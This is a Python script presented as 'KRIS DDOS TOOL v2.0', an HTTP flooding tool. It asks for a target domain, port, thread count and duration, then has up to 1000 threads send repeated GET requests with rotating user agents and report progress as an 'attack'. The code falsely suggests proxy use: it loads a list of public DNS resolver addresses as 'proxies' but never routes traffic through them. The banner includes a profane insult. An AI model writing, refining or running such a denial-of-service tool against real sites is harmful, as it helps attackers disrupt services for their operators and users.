
import socket
import struct
import threading
import time
from random import randint
from ipaddress import ip_address
from urllib.parse import urlparse
import sys

def print_logo():
    # ANSI color codes - using RGB approximation for #640D5F
    purple = '\033[38;2;100;13;95m'  # RGB color for #640D5F
    cyan = '\033[36m'
    yellow = '\033[33m'
    red = '\033[31m'
    green = '\033[32m'
    bold = '\033[1m'
    reset = '\033[0m'
    
    logo = f"""
{purple}{bold}    ██╗  ██╗██████╗ ██╗███████╗    ██████╗ ██████╗  ██████╗ ███████╗
{purple}    ██║ ██╔╝██╔══██╗██║██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
{purple}    █████╔╝ ██████╔╝██║███████╗    ██║  ██║██║  ██║██║   ██║███████╗
{purple}    ██╔═██╗ ██╔══██╗██║╚════██║    ██║  ██║██║  ██║██║   ██║╚════██║
{purple}    ██║  ██╗██║  ██║██║███████║    ██████╔╝██████╔╝╚██████╔╝███████║
{purple}    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝{reset}
    
{cyan}    ╔══════════════════════════════════════════════════════════════╗
{cyan}    ║{yellow}{bold}                     KRIS DDOS TOOL v2.0                    {reset}{cyan}║
{cyan}    ║{green}                        By @Kris_Real                         {reset}{cyan}║
{cyan}    ║{red}                    edit code: fuckurmom                        {reset}{cyan}║
{cyan}    ╚══════════════════════════════════════════════════════════════╝{reset}
    """
    print(logo)

# Create a simple proxy list if file doesn't exist
try:
    with open("proxies.txt", "r") as f:
        proxies = [line.strip() for line in f.readlines() if line.strip()]
except FileNotFoundError:
    # Use some public proxy IPs as fallback
    proxies = ["8.8.8.8", "1.1.1.1", "208.67.222.222", "9.9.9.9", "76.76.79.79"] * 100

# Global variables for attack control
attack_active = True
attack_count = 0

def send_packet(domain, port, path, proxy_ip, attack_duration):
    global attack_active, attack_count
    start_time = time.time()
    
    while attack_active and (time.time() - start_time) < attack_duration:
        try:
            # Create a socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)  # Shorter timeout for faster requests
            
            # Create HTTP request with random user agents
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
            ]
            
            request = f"GET {path} HTTP/1.1\r\n"
            request += f"Host: {domain}\r\n"
            request += f"User-Agent: {user_agents[randint(0, len(user_agents)-1)]}\r\n"
            request += "Connection: keep-alive\r\n"
            request += "Cache-Control: no-cache\r\n"
            request += "\r\n"
            
            # Connect to target
            try:
                s.connect((domain, port))
                s.sendall(request.encode())
                
                # Try to receive response (optional)
                try:
                    response = s.recv(1024)
                except:
                    pass
                
                attack_count += 1
                if attack_count % 100 == 0:
                    print(f"[+] Packets sent: {attack_count}")
                    
            except Exception as e:
                pass  # Silent fail for faster execution
            finally:
                s.close()
                
        except Exception as e:
            pass  # Silent fail
        
        # Small delay to prevent overwhelming
        time.sleep(0.01)

def get_user_input():
    print_logo()
    print("\n" + "="*60)
    print("           KRIS DDOS TOOL - CONFIGURATION")
    print("="*60)
    
    # Get target domain
    while True:
        target = input("\n[?] Enter target domain (e.g., example.com): ").strip()
        if target:
            break
        print("[!] Please enter a valid domain!")
    
    # Get port
    while True:
        try:
            port = int(input("[?] Enter target port (default 80): ") or "80")
            if 1 <= port <= 65535:
                break
            else:
                print("[!] Port must be between 1 and 65535!")
        except ValueError:
            print("[!] Please enter a valid port number!")
    
    # Get number of threads
    while True:
        try:
            threads = int(input("[?] Enter number of threads (default 100): ") or "100")
            if 1 <= threads <= 1000:
                break
            else:
                print("[!] Threads must be between 1 and 1000!")
        except ValueError:
            print("[!] Please enter a valid number of threads!")
    
    # Get attack duration
    while True:
        try:
            duration = int(input("[?] Enter attack duration in seconds (default 60): ") or "60")
            if 1 <= duration <= 3600:
                break
            else:
                print("[!] Duration must be between 1 and 3600 seconds!")
        except ValueError:
            print("[!] Please enter a valid duration!")
    
    return target, port, threads, duration

def main():
    global attack_active, attack_count
    
    # Get user input
    target, port, num_threads, attack_duration = get_user_input()
    
    print(f"\n{'='*60}")
    print("                    ATTACK STARTING")
    print(f"{'='*60}")
    print(f"[>] Target: {target}:{port}")
    print(f"[>] Threads: {num_threads}")
    print(f"[>] Duration: {attack_duration} seconds")
    print(f"[>] Total proxies loaded: {len(proxies)}")
    print(f"{'='*60}")
    
    # Confirmation
    confirm = input("\n[?] Start attack? (y/N): ").lower()
    if confirm != 'y':
        print("[!] Attack cancelled.")
        return
    
    print(f"\n[+] Starting attack on {target}:{port}...")
    print("[+] Press Ctrl+C to stop the attack early")
    
    # Reset counters
    attack_active = True
    attack_count = 0
    
    # Create and start threads
    threads = []
    path = "/"
    
    try:
        for i in range(num_threads):
            proxy_ip = proxies[i % len(proxies)]
            t = threading.Thread(
                target=send_packet, 
                args=(target, port, path, proxy_ip, attack_duration)
            )
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Monitor attack progress
        start_time = time.time()
        try:
            while attack_active and (time.time() - start_time) < attack_duration:
                time.sleep(1)
                elapsed = int(time.time() - start_time)
                remaining = attack_duration - elapsed
                print(f"\r[+] Attack progress: {elapsed}/{attack_duration}s | Packets: {attack_count} | Remaining: {remaining}s", end="")
                
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user!")
            attack_active = False
        
        # Stop attack
        attack_active = False
        
        # Wait for threads to finish
        print(f"\n[+] Stopping attack...")
        for t in threads:
            t.join(timeout=1)
        
        print(f"\n{'='*60}")
        print("                   ATTACK COMPLETED")
        print(f"{'='*60}")
        print(f"[+] Total packets sent: {attack_count}")
        print(f"[+] Attack duration: {int(time.time() - start_time)} seconds")
        print(f"[+] Average packets/second: {attack_count / max(1, int(time.time() - start_time)):.2f}")
        
    except Exception as e:
        print(f"\n[!] Error during attack: {e}")
        attack_active = False

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Program interrupted by user!")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)
